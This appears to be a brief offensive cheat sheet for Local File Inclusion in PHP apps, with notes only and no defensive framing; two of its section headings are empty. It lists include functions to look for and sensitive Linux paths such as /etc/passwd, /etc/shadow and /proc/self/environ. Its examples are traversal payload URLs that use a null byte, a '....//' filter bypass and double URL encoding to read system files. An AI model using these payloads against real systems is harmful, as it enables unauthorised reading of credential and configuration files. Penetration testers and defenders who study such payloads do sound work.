---
  title: "Local File Inclusion"
---

# Intro
# Source code hints
-include
-require
-include_once 
-require_once 

# Interesting paths in Linux
-/etc/issue
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/motd
-/etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
-/proc/self/environ
-/proc/version
-/proc/cmdline

# Interesting paths in Windows
# Examples
http://examples/page.php?file=/etc/passwd
http://example/page.php?file=../../../../../../etc/passwd
http://example/page.php?file=../../../../../../etc/passwd%00
http://example/page.php?file=....//....//....//....//etc/passwd
http://example/page.php?file=%252e%252e%252fetc%252fpasswd
